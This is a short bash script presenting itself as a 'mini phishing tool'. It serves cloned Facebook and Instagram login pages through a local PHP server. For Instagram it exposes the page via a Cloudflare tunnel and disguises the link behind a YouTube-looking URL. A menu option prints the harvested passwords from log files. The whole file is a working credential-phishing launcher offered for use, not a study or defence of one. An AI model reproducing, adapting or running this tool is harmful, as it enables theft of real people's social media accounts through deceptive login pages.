#!/bin/bash
clear
echo "============================"
echo "    MINI PHISHING TOOL      "
echo "============================"
echo "[1] Facebook"
echo "[2] Instagram"
echo "[3] View Saved Passwords"
echo "[4] Exit"
read -p "Choose an option: " opt

if [ $opt -eq 1 ]; then
    echo "Starting Facebook Server..."
    cd sites/facebook && php -S 127.0.0.1:8080
elif [ $opt -eq 2 ]; then
    echo "Starting Instagram Server..."
    cd sites/instagram && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    echo "Generating Link..."
    ./../../cloudflared tunnel --url http://127.0.0.1:8080 > link.log 2>&1 &
    sleep 8
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' link.log)
    echo -e "\n\e[32m[+] Link: \e[34m https://youtube.com/shorts/cYEbfTkzpTA?si=DcIY1oiU_4xfGQ8a ${link#https://}\e[0m\n"
    echo "Press Ctrl+C to stop the server."
    wait
elif [ $opt -eq 3 ]; then
    echo "--- SAVED PASSWORDS ---"
    cat sites/facebook/log.txt 2>/dev/null
    cat sites/instagram/log.txt 2>/dev/null
else
    exit
fi
